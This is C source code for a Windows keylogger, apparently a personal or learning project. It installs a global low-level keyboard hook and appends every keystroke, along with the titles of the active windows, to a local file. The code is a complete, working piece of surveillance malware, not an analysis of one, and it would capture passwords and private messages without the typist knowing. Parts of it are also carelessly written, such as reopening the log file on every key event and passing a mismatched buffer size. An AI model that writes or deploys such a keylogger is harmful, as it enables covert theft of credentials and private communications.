#include <Windows.h>
#include <stdio.h>

#include "klogger.h"

FILE* kbpFile;
HWND lastWindow;
wchar_t lastWindowTitle[256];

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, INT iCmdShow)
{
	MSG msg;

	if (!(kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)))
		return 1;

	while (GetMessage(&msg, NULL, 0, 0) != 0);

	UnhookWindowsHookEx(kbhook);

	return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
{
	_wfopen_s(&kbpFile, kbtestfile, L"a+");

	HWND currentWindow = GetForegroundWindow();
	wchar_t currentWindowTitle[256];
	GetWindowTextW(currentWindow, currentWindowTitle, 256);

	if (wcsncmp(lastWindowTitle, currentWindowTitle, 256)) {
		wchar_t output[256];
		lastWindow = currentWindow;
		wcsncpy_s(lastWindowTitle, 256, currentWindowTitle, sizeof(currentWindowTitle));
		swprintf_s(output, 256, L"[%s]", currentWindowTitle);
		fputws(output, kbpFile);
	}

	if (code >= 0) {
		if (wParam == WM_KEYDOWN) {
			PKBDLLHOOKSTRUCT kbhstruct = (PKBDLLHOOKSTRUCT)lParam;
			DWORD vkey = kbhstruct->vkCode;
			if (vkey == 0x01 || vkey == 0x02)
				;
			// 0x30 to 0x5a define characters (save for a few undefined)
			// 0x60 to 0x69 define numpad keys
			else if (vkey >= 0x30 && vkey <= 0x5a || vkey >= 0x60 && vkey <= 0x69)
			{
				// buffer[i++] = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
				char value[] = { MapVirtualKey(vkey, MAPVK_VK_TO_CHAR) };
				fputc(value[0], kbpFile);
			}
			// 0x70 to 0x87 are func keys
			else if (vkey >= 0x70 && vkey <= 0x87)
			{
				wchar_t value[] = { MapVirtualKey(vkey, MAPVK_VK_TO_CHAR) };
				fputws(value, kbpFile);
			}
			else
			{
				switch (vkey)
				{
				case VK_CANCEL:
					fputs("[ctrl+break]", kbpFile);
					break;
				case VK_MBUTTON:
					fputs("[middle-mouse]", kbpFile);
					break;
				case VK_XBUTTON1:
					fputs("[x1-mouse]", kbpFile);
					break;
				case VK_XBUTTON2:
					fputs("[x2-mouse]", kbpFile);
					break;
				case VK_BACK:
					fputs("[back]", kbpFile);
					break;
				case VK_TAB:
					fputs("[tab]", kbpFile);
					break;
				case VK_CLEAR:
					fputs("[clear]", kbpFile);
					break;
				case VK_RETURN:
					fputs("[enter]", kbpFile);
					break;
				case VK_CONTROL:
					fputs("[ctrl]", kbpFile);
					break;
				case VK_MENU:
					fputs("[alt]", kbpFile);
					break;
				case VK_PAUSE:
					fputs("[pause]", kbpFile);
					break;
				case VK_CAPITAL:
					fputs("[caps]", kbpFile);
					break;
				case VK_KANA:
					fputs("[kana/hangul mode]", kbpFile);
					break;
				case VK_JUNJA:
					fputs("[junja mode]", kbpFile);
					break;
				case VK_FINAL:
					fputs("[final mode]", kbpFile);
					break;
				case VK_HANJA:
					fputs("[kanji/hanja mode]", kbpFile);
					break;
				case VK_ESCAPE:
					fputs("[esc]", kbpFile);
					break;
				case VK_SPACE:
					//fputs("[space]", kbpFile);
					fputs(" ", kbpFile);
					break;
				case VK_PRIOR:
					fputs("[page up]", kbpFile);
					break;
				case VK_NEXT:
					fputs("[page down]", kbpFile);
					break;
				case VK_END:
					fputs("[end]", kbpFile);
					break;
				case VK_HOME:
					fputs("[home]", kbpFile);
					break;
				case VK_LEFT:
					fputs("[left]", kbpFile);
					break;
				case VK_UP:
					fputs("[up]", kbpFile);
					break;
				case VK_RIGHT:
					fputs("[right]", kbpFile);
					break;
				case VK_DOWN:
					fputs("[down]", kbpFile);
					break;
				case VK_SELECT:
					fputs("[select]", kbpFile);
					break;
				case VK_PRINT:
					fputs("[print]", kbpFile);
					break;
				case VK_EXECUTE:
					fputs("[exe]", kbpFile);
					break;
				case VK_SNAPSHOT:
					fputs("[prtsc]", kbpFile);
					break;
				case VK_INSERT:
					fputs("[insert]", kbpFile);
					break;
				case VK_DELETE:
					fputs("[del]", kbpFile);
					break;
				case VK_HELP:
					fputs("[help]", kbpFile);
					break;
				case VK_LWIN:
					fputs("[lwin]", kbpFile);
					break;
				case VK_RWIN:
					fputs("[rwin]", kbpFile);
					break;
				case VK_APPS:
					fputs("[apps]", kbpFile);
					break;
				case VK_SLEEP:
					fputs("[sleep]", kbpFile);
					break;
				case VK_ADD:
					fputs("[add]", kbpFile);
					break;
				case VK_SEPARATOR:
					fputs("[separator]", kbpFile);
					break;
				case VK_SUBTRACT:
					fputs("[sub]", kbpFile);
					break;
				case VK_DECIMAL:
					fputs("[decimal]", kbpFile);
					break;
				case VK_DIVIDE:
					fputs("[slash]", kbpFile);
					break;
				case VK_NUMLOCK:
					fputs("[num]", kbpFile);
					break;
				case VK_SCROLL:
					fputs("[scroll]", kbpFile);
					break;
				case VK_LCONTROL:
					fputs("[lctrl]", kbpFile);
					break;
				case VK_RCONTROL:
					fputs("[rctrl]", kbpFile);
					break;
				case VK_LMENU:
					fputs("[lalt]", kbpFile);
					break;
				case VK_RMENU:
					fputs("[ralt]", kbpFile);
					break;
				case VK_LSHIFT:
					fputs("[lshift]", kbpFile);
					break;
				case VK_RSHIFT:
					fputs("[rshift]", kbpFile);
					break;
				default:
					break;
				}
			}
		}
	}
	fclose(kbpFile);
	return CallNextHookEx(kbhook, code, wParam, lParam);
}

// Other interesting functions: GetAsyncKeyState(), GetKeyboardLayout(), GetWindowThreadProcessId()
// With a hook, these functions seem unnecessary
//
// THIS IS A TEST STRING.
//
// If we were to use a buffer, we could use sprintf_s/swprintf_s to keep track of the size of the buffer
//
// int j;
// if ((j += swprintf_s(buffer, 140, "%s", vkeyFunc()) >= 140) { // do something }